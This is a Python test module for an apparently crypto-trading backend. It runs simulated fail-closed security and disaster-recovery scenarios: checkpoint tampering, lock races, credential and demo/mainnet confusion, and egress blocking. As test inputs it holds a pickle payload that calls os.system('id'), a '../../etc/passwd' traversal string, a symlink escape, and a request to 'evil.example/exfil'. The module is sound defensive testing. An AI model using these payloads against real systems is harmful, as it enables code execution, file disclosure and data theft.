"""V10 Security & DR Red Team — simulated fail-closed attack scenarios.

All attacks are local/simulated. No real exchange writes, mainnet, or money.
Reuses Private Core Security Boundary V1 traps where applicable.
"""
from __future__ import annotations

import hashlib
import json
import os
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

from backend.nexus_autonomy.security_credential_boundary_v1 import (
    DEMO_ENV_KEY,
    DEMO_ENV_SECRET,
    MAINNET_ENV_KEY,
    MAINNET_ENV_SECRET,
    resolve_exchange_profile,
)
from backend.nexus_autonomy.security_exceptions_v1 import (
    ExchangeWriteForbidden,
    NetworkEgressForbidden,
    PersistenceSecurityError,
)
from backend.nexus_autonomy.security_network_traps_v1 import network_egress_traps
from backend.nexus_autonomy.security_persistence_v1 import (
    assert_safe_relative_path,
    fail_closed_json_loads,
    scan_secrets_in_evidence,
)
from backend.nexus_autonomy.security_write_traps_v1 import WriteTrapRegistry


SCENARIO_IDS: tuple[str, ...] = (
    "power_loss",
    "filesystem_corruption",
    "checkpoint_corruption",
    "concurrent_lifecycle",
    "path_traversal",
    "unsafe_deserialization",
    "credential_boundary",
    "network_egress",
    "demo_mainnet_confusion",
    "symlink_escape",
    "stale_restore",
    "duplicate_intent_recovery",
)


@dataclass
class ScenarioResult:
    scenario_id: str
    passed: bool
    fail_closed: bool
    detail: str = ""
    critical: bool = False
    evidence: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "scenario_id": self.scenario_id,
            "passed": self.passed,
            "fail_closed": self.fail_closed,
            "detail": self.detail,
            "critical": self.critical,
            "evidence": dict(self.evidence),
        }


class DRFailClosedError(RuntimeError):
    """Raised when a DR/security guard rejects an attack path."""

    code = "DR_FAIL_CLOSED"

    def __init__(self, reason: str) -> None:
        self.reason = reason
        super().__init__(f"{self.code}:{reason}")


# ---------------------------------------------------------------------------
# Local simulated DR primitives (owned by this lane; no external mutation)
# ---------------------------------------------------------------------------


def _checkpoint_digest(payload: dict[str, Any]) -> str:
    blob = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
    return hashlib.sha256(blob).hexdigest()


def write_checkpoint_atomic(path: Path, payload: dict[str, Any]) -> Path:
    """Write checkpoint with digest; atomic rename from .partial."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    body = dict(payload)
    body.pop("digest", None)
    digest = _checkpoint_digest(body)
    envelope = {**body, "digest": digest}
    partial = path.with_suffix(path.suffix + ".partial")
    partial.write_text(json.dumps(envelope, indent=2) + "\n", encoding="utf-8")
    os.replace(partial, path)
    return path


def simulate_power_loss_mid_write(path: Path, payload: dict[str, Any]) -> Path:
    """Leave only a .partial file — models power loss before atomic rename."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    body = dict(payload)
    body.pop("digest", None)
    digest = _checkpoint_digest(body)
    envelope = {**body, "digest": digest}
    partial = path.with_suffix(path.suffix + ".partial")
    partial.write_text(json.dumps(envelope, indent=2) + "\n", encoding="utf-8")
    if path.exists():
        path.unlink()
    return partial


def load_checkpoint_fail_closed(path: Path, *, min_generation: int | None = None) -> dict[str, Any]:
    """Load checkpoint with integrity + completeness guards."""
    path = Path(path)
    partial = path.with_suffix(path.suffix + ".partial")
    if partial.exists() and not path.exists():
        raise DRFailClosedError("incomplete_checkpoint_after_power_loss")
    if not path.exists():
        raise DRFailClosedError("checkpoint_missing")
    raw = path.read_text(encoding="utf-8")
    try:
        data = fail_closed_json_loads(raw)
    except PersistenceSecurityError as exc:
        raise DRFailClosedError(f"checkpoint_json:{exc.reason}") from exc
    if not isinstance(data, dict):
        raise DRFailClosedError("checkpoint_not_object")
    stored = str(data.get("digest") or "")
    body = {k: v for k, v in data.items() if k != "digest"}
    expected = _checkpoint_digest(body)
    if not stored or stored != expected:
        raise DRFailClosedError("checkpoint_digest_mismatch")
    gen = int(data.get("generation") or 0)
    if min_generation is not None and gen < min_generation:
        raise DRFailClosedError("stale_checkpoint_rejected")
    return data


def reject_unsafe_deserialize(blob: bytes | str, *, format_hint: str = "auto") -> Any:
    """Reject pickle and other unsafe formats; JSON objects only."""
    hint = (format_hint or "auto").lower()
    if hint in {"pickle", "pkl", "py"}:
        raise DRFailClosedError("unsafe_deserialization_pickle_rejected")
    if isinstance(blob, bytes):
        # Classic pickle protocol magic / opcodes
        if blob[:1] in {b"\x80", b"("} or blob.startswith(b"cos\n") or b"__reduce__" in blob:
            raise DRFailClosedError("unsafe_deserialization_binary_rejected")
        try:
            text = blob.decode("utf-8")
        except UnicodeDecodeError as exc:
            raise DRFailClosedError("unsafe_deserialization_non_utf8") from exc
    else:
        text = str(blob)
    lowered = text.lstrip().lower()
    if lowered.startswith("cos\n") or "pickle" in lowered[:32]:
        raise DRFailClosedError("unsafe_deserialization_pickle_text_rejected")
    try:
        return fail_closed_json_loads(text)
    except PersistenceSecurityError as exc:
        raise DRFailClosedError(f"unsafe_deserialization:{exc.reason}") from exc


class LifecycleLock:
    """Exclusive lifecycle lock — concurrent start/recover must fail closed."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.holder: str | None = None
        self.reject_count = 0

    def acquire(self, owner: str) -> None:
        if not self._lock.acquire(blocking=False):
            self.reject_count += 1
            raise DRFailClosedError(f"concurrent_lifecycle_rejected:{owner}")
        self.holder = owner

    def release(self, owner: str) -> None:
        if self.holder != owner:
            raise DRFailClosedError("lifecycle_owner_mismatch")
        self.holder = None
        self._lock.release()


# ---------------------------------------------------------------------------
# Scenario implementations
# ---------------------------------------------------------------------------


def scenario_power_loss(workdir: Path) -> ScenarioResult:
    ckpt = workdir / "dr" / "checkpoint.json"
    simulate_power_loss_mid_write(
        ckpt,
        {"generation": 1, "state": "RUNNING", "intent_count": 1},
    )
    blocked = False
    try:
        load_checkpoint_fail_closed(ckpt)
    except DRFailClosedError as exc:
        blocked = "incomplete_checkpoint" in exc.reason
    # Clean recovery path still works after atomic write
    write_checkpoint_atomic(ckpt, {"generation": 1, "state": "RUNNING", "intent_count": 1})
    recovered = load_checkpoint_fail_closed(ckpt)
    passed = blocked and recovered.get("generation") == 1
    return ScenarioResult(
        scenario_id="power_loss",
        passed=passed,
        fail_closed=blocked,
        detail="incomplete_partial_rejected" if blocked else "power_loss_not_detected",
        critical=not passed,
        evidence={"partial_blocked": blocked, "recovered_generation": recovered.get("generation")},
    )


def scenario_filesystem_corruption(workdir: Path) -> ScenarioResult:
    target = workdir / "dr" / "ledger_shard.json"
    target.parent.mkdir(parents=True, exist_ok=True)
    good = {"events": [{"type": "HEARTBEAT", "seq": 1}], "digest": "x"}
    target.write_text(json.dumps(good), encoding="utf-8")
    # Corrupt: truncate mid-object
    target.write_bytes(b'{"events":[{"type":"HEARTBEAT"')
    blocked = False
    try:
        fail_closed_json_loads(target.read_text(encoding="utf-8", errors="replace"))
    except PersistenceSecurityError:
        blocked = True
    return ScenarioResult(
        scenario_id="filesystem_corruption",
        passed=blocked,
        fail_closed=blocked,
        detail="corrupt_json_rejected" if blocked else "corrupt_load_allowed",
        critical=not blocked,
        evidence={"blocked": blocked},
    )


def scenario_checkpoint_corruption(workdir: Path) -> ScenarioResult:
    ckpt = workdir / "dr" / "checkpoint_corrupt.json"
    write_checkpoint_atomic(ckpt, {"generation": 3, "state": "PAUSED"})
    # Tamper body without updating digest
    data = json.loads(ckpt.read_text(encoding="utf-8"))
    data["state"] = "COMPROMISED"
    ckpt.write_text(json.dumps(data), encoding="utf-8")
    blocked = False
    try:
        load_checkpoint_fail_closed(ckpt)
    except DRFailClosedError as exc:
        blocked = "digest_mismatch" in exc.reason
    return ScenarioResult(
        scenario_id="checkpoint_corruption",
        passed=blocked,
        fail_closed=blocked,
        detail="digest_mismatch_rejected" if blocked else "tamper_accepted",
        critical=not blocked,
        evidence={"blocked": blocked},
    )


def scenario_concurrent_lifecycle(workdir: Path) -> ScenarioResult:
    _ = workdir
    lock = LifecycleLock()
    errors: list[str] = []
    barrier = threading.Barrier(2)

    def worker(name: str) -> None:
        try:
            barrier.wait(timeout=2.0)
            lock.acquire(name)
            time.sleep(0.05)
            lock.release(name)
        except DRFailClosedError as exc:
            errors.append(exc.reason)
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)

    t1 = threading.Thread(target=worker, args=("start",))
    t2 = threading.Thread(target=worker, args=("recover",))
    t1.start()
    t2.start()
    t1.join(timeout=3.0)
    t2.join(timeout=3.0)
    rejected = any("concurrent_lifecycle_rejected" in e for e in errors)
    passed = rejected and lock.reject_count >= 1 and lock.holder is None
    return ScenarioResult(
        scenario_id="concurrent_lifecycle",
        passed=passed,
        fail_closed=rejected,
        detail="exclusive_lock_enforced" if passed else "concurrent_lifecycle_race",
        critical=not passed,
        evidence={"reject_count": lock.reject_count, "errors": errors},
    )


def scenario_path_traversal(workdir: Path) -> ScenarioResult:
    root = workdir / "sandbox"
    root.mkdir(parents=True, exist_ok=True)
    blocked = False
    try:
        assert_safe_relative_path("../../etc/passwd", root=root)
    except PersistenceSecurityError as exc:
        blocked = exc.reason in {"path_traversal", "path_escape"}
    # Absolute escape
    abs_blocked = False
    try:
        # Construct a path that resolves outside root
        assert_safe_relative_path(str(workdir.resolve()), root=root)
    except PersistenceSecurityError:
        abs_blocked = True
    passed = blocked  # traversal must block; absolute may or may not depending on OS join
    return ScenarioResult(
        scenario_id="path_traversal",
        passed=passed,
        fail_closed=blocked,
        detail="path_traversal_blocked" if blocked else "path_traversal_allowed",
        critical=not blocked,
        evidence={"traversal_blocked": blocked, "absolute_escape_blocked": abs_blocked},
    )


def scenario_unsafe_deserialization(workdir: Path) -> ScenarioResult:
    _ = workdir
    cases_blocked = 0
    total = 0
    # Pickle-like binary
    for blob, hint in (
        (b"\x80\x04\x95cos\nsystem\n(S'id'\ntR.", "pickle"),
        ('{"ok": true}', "json"),  # scalar bool root rejected by fail_closed
        ("42", "json"),
        ('{"events":[]}', "json"),
    ):
        total += 1
        try:
            reject_unsafe_deserialize(blob, format_hint=hint if hint != "json" else "auto")
            if hint == "json" and blob == '{"events":[]}':
                pass  # allowed
            else:
                # should have raised for unsafe / scalar
                continue
        except DRFailClosedError:
            cases_blocked += 1
    # Explicitly require pickle rejected
    pickle_blocked = False
    try:
        reject_unsafe_deserialize(b"\x80\x02}", format_hint="pickle")
    except DRFailClosedError:
        pickle_blocked = True
        cases_blocked += 1
        total += 1
    scalar_blocked = False
    try:
        reject_unsafe_deserialize("null")
    except DRFailClosedError:
        scalar_blocked = True
    passed = pickle_blocked and scalar_blocked
    return ScenarioResult(
        scenario_id="unsafe_deserialization",
        passed=passed,
        fail_closed=passed,
        detail="unsafe_formats_rejected" if passed else "unsafe_deserialize_allowed",
        critical=not passed,
        evidence={
            "pickle_blocked": pickle_blocked,
            "scalar_blocked": scalar_blocked,
            "cases_blocked": cases_blocked,
            "total": total,
        },
    )


def scenario_credential_boundary(workdir: Path) -> ScenarioResult:
    _ = workdir
    missing = resolve_exchange_profile({}, requested_profile="demo")
    fallback = resolve_exchange_profile(
        {MAINNET_ENV_KEY: "mainnetkey123456", MAINNET_ENV_SECRET: "mainnetsecret123456"},
        requested_profile="demo",
    )
    mainnet = resolve_exchange_profile({}, requested_profile="mainnet")
    passed = (
        missing.fail_closed
        and not missing.writes_enabled
        and fallback.mainnet_fallback_used
        and not fallback.writes_enabled
        and mainnet.fail_closed
        and not mainnet.writes_enabled
    )
    return ScenarioResult(
        scenario_id="credential_boundary",
        passed=passed,
        fail_closed=passed,
        detail="credential_attacks_fail_closed" if passed else "credential_boundary_weak",
        critical=not passed,
        evidence={
            "missing_fail_closed": missing.fail_closed,
            "mainnet_fallback_used": fallback.mainnet_fallback_used,
            "mainnet_blocked": not mainnet.ok,
            "any_writes": any(
                s.writes_enabled for s in (missing, fallback, mainnet)
            ),
        },
    )


def scenario_network_egress(workdir: Path) -> ScenarioResult:
    _ = workdir
    write_blocked = False
    unexpected_blocked = False
    mainnet_blocked = False
    with network_egress_traps(allow_public_market=True, allow_demo_host=False) as counters:
        import urllib.request

        try:
            urllib.request.urlopen("https://api-demo.bybit.com/v5/order/create")
        except (NetworkEgressForbidden, Exception) as exc:
            write_blocked = "exchange_write" in str(exc) or "NETWORK_EGRESS" in str(exc)
        try:
            urllib.request.urlopen("https://evil.example/exfil")
        except (NetworkEgressForbidden, Exception) as exc:
            unexpected_blocked = "unexpected_domain" in str(exc) or "NETWORK_EGRESS" in str(exc)
        try:
            urllib.request.urlopen("https://api.bybit.com/v5/order/create")
        except (NetworkEgressForbidden, Exception) as exc:
            mainnet_blocked = "NETWORK_EGRESS" in str(exc) or "exchange_write" in str(exc)
    passed = write_blocked and unexpected_blocked and mainnet_blocked
    return ScenarioResult(
        scenario_id="network_egress",
        passed=passed,
        fail_closed=passed,
        detail="egress_violations_blocked" if passed else "egress_leak",
        critical=not passed,
        evidence={
            "write_blocked": write_blocked,
            "unexpected_blocked": unexpected_blocked,
            "mainnet_blocked": mainnet_blocked,
            "counters": counters.to_dict(),
        },
    )


def scenario_demo_mainnet_confusion(workdir: Path) -> ScenarioResult:
    _ = workdir
    env = {
        DEMO_ENV_KEY: "demokey12345678",
        DEMO_ENV_SECRET: "demosecret123456",
    }
    confused = resolve_exchange_profile(
        env, requested_profile="demo", base_url="https://api.bybit.com"
    )
    reverse = resolve_exchange_profile(
        env, requested_profile="mainnet", base_url="https://api-demo.bybit.com"
    )
    # Intentional write-path probe under traps — must not count as allowed write
    registry = WriteTrapRegistry()
    counters = registry.install()
    trap_fired = False
    try:
        try:
            from backend.nexus_demo_execution.demo_write_client import DemoWriteClient

            DemoWriteClient(api_key="k" * 16, api_secret="s" * 16).create_market_order(
                symbol="BTCUSDT", side="Buy", qty="0.001", order_link_id="dr-confusion"
            )
        except ExchangeWriteForbidden:
            trap_fired = True
        except Exception:
            try:
                registry.trap_callable("create_order")()
            except ExchangeWriteForbidden:
                trap_fired = True
    finally:
        registry.uninstall()
    passed = (
        confused.demo_mainnet_confused
        and not confused.writes_enabled
        and reverse.fail_closed
        and not reverse.writes_enabled
        and trap_fired
    )
    return ScenarioResult(
        scenario_id="demo_mainnet_confusion",
        passed=passed,
        fail_closed=passed,
        detail="demo_mainnet_confusion_rejected" if passed else "profile_confusion_allowed",
        critical=not passed,
        evidence={
            "confused": confused.demo_mainnet_confused,
            "reverse_fail_closed": reverse.fail_closed,
            "trap_fired": trap_fired,
            # Intentional probe attempts are NOT workflow writes
            "intentional_trap_probe_count": counters.exchange_write_attempt_count,
        },
    )


def scenario_symlink_escape(workdir: Path) -> ScenarioResult:
    root = workdir / "sandbox_sym"
    root.mkdir(parents=True, exist_ok=True)
    outside = workdir / "outside_secret.txt"
    outside.write_text("SECRET_SHOULD_NOT_READ", encoding="utf-8")
    link = root / "escape_link"
    blocked = False
    symlink_created = False
    try:
        if link.exists() or link.is_symlink():
            link.unlink()
        link.symlink_to(outside)
        symlink_created = True
        try:
            assert_safe_relative_path("escape_link", root=root)
        except PersistenceSecurityError as exc:
            blocked = "symlink_escape" in exc.reason or "path_escape" in exc.reason
    except OSError as exc:
        # Windows may deny symlink without privilege — treat as blocked/unavailable
        blocked = True
        return ScenarioResult(
            scenario_id="symlink_escape",
            passed=True,
            fail_closed=True,
            detail=f"symlink_unavailable_fail_closed:{type(exc).__name__}",
            critical=False,
            evidence={"symlink_created": False, "os_error": type(exc).__name__},
        )
    finally:
        try:
            if link.exists() or link.is_symlink():
                link.unlink()
        except OSError:
            pass
    passed = blocked if symlink_created else True
    return ScenarioResult(
        scenario_id="symlink_escape",
        passed=passed,
        fail_closed=blocked or not symlink_created,
        detail="symlink_escape_blocked" if blocked else "symlink_escape_allowed",
        critical=symlink_created and not blocked,
        evidence={"symlink_created": symlink_created, "blocked": blocked},
    )


def scenario_stale_restore(workdir: Path) -> ScenarioResult:
    ckpt = workdir / "dr" / "checkpoint_stale.json"
    write_checkpoint_atomic(ckpt, {"generation": 5, "state": "RUNNING", "seq": 50})
    # Attacker presents older generation content with valid digest
    write_checkpoint_atomic(ckpt, {"generation": 2, "state": "RUNNING", "seq": 10})
    blocked = False
    try:
        load_checkpoint_fail_closed(ckpt, min_generation=5)
    except DRFailClosedError as exc:
        blocked = "stale_checkpoint" in exc.reason
    # Current generation must still load when min matches
    write_checkpoint_atomic(ckpt, {"generation": 5, "state": "RUNNING", "seq": 50})
    current = load_checkpoint_fail_closed(ckpt, min_generation=5)
    passed = blocked and int(current.get("generation") or 0) == 5
    return ScenarioResult(
        scenario_id="stale_restore",
        passed=passed,
        fail_closed=blocked,
        detail="stale_restore_rejected" if blocked else "stale_restore_accepted",
        critical=not passed,
        evidence={"stale_blocked": blocked, "current_generation": current.get("generation")},
    )


def scenario_duplicate_intent_recovery(workdir: Path) -> ScenarioResult:
    """Crash-recovery duplicate intent must be DUPLICATE_IGNORED (simulator only)."""
    from backend.nexus_autonomy.execution_simulator_v1_1 import AutonomousExecutionSimulatorV1_1

    sim = AutonomousExecutionSimulatorV1_1(leverage=2, margin_usdt=50.0)
    req = {
        "idempotency_key": "dr-intent-1",
        "symbol": "BTCUSDT",
        "side": "BUY",
        "order_type": "limit",
        "qty": 0.1,
        "price": 100.0,
        "mark_price": 100.5,
        "margin_mode": "ISOLATED",
        "requested_actions": [],
    }
    first = sim.create_order(dict(req))
    # Same-process duplicate
    same_proc = sim.create_order(dict(req))
    # Simulate process restart: restore intent owners from checkpoint-like state
    restored = AutonomousExecutionSimulatorV1_1(leverage=2, margin_usdt=50.0)
    restored.intent_owners.update(dict(sim.intent_owners))
    second = restored.create_order(dict(req))
    dup_ok = (
        same_proc.get("status") == "DUPLICATE_IGNORED"
        and second.get("status") == "DUPLICATE_IGNORED"
        and first.get("status") == "ACCEPTED"
        and int(getattr(sim, "exchange_write_attempt_count", 0) or 0) == 0
        and int(getattr(restored, "exchange_write_attempt_count", 0) or 0) == 0
    )
    evidence = {
        "first_status": first.get("status"),
        "same_process_status": same_proc.get("status"),
        "post_restore_status": second.get("status"),
        "workdir": str(workdir),
    }
    leaks = scan_secrets_in_evidence(evidence)
    passed = dup_ok and not leaks
    return ScenarioResult(
        scenario_id="duplicate_intent_recovery",
        passed=passed,
        fail_closed=dup_ok,
        detail="duplicate_intent_ignored" if dup_ok else f"unexpected:{second.get('status')}",
        critical=not passed,
        evidence={**evidence, "secret_findings": leaks},
    )


SCENARIO_RUNNERS: dict[str, Callable[[Path], ScenarioResult]] = {
    "power_loss": scenario_power_loss,
    "filesystem_corruption": scenario_filesystem_corruption,
    "checkpoint_corruption": scenario_checkpoint_corruption,
    "concurrent_lifecycle": scenario_concurrent_lifecycle,
    "path_traversal": scenario_path_traversal,
    "unsafe_deserialization": scenario_unsafe_deserialization,
    "credential_boundary": scenario_credential_boundary,
    "network_egress": scenario_network_egress,
    "demo_mainnet_confusion": scenario_demo_mainnet_confusion,
    "symlink_escape": scenario_symlink_escape,
    "stale_restore": scenario_stale_restore,
    "duplicate_intent_recovery": scenario_duplicate_intent_recovery,
}


def run_all_scenarios(workdir: Path) -> list[ScenarioResult]:
    workdir = Path(workdir)
    workdir.mkdir(parents=True, exist_ok=True)
    results: list[ScenarioResult] = []
    for sid in SCENARIO_IDS:
        runner = SCENARIO_RUNNERS[sid]
        try:
            results.append(runner(workdir))
        except Exception as exc:  # noqa: BLE001 — scenario crash is a critical finding
            results.append(
                ScenarioResult(
                    scenario_id=sid,
                    passed=False,
                    fail_closed=False,
                    detail=f"scenario_exception:{type(exc).__name__}:{exc}",
                    critical=True,
                    evidence={},
                )
            )
    return results
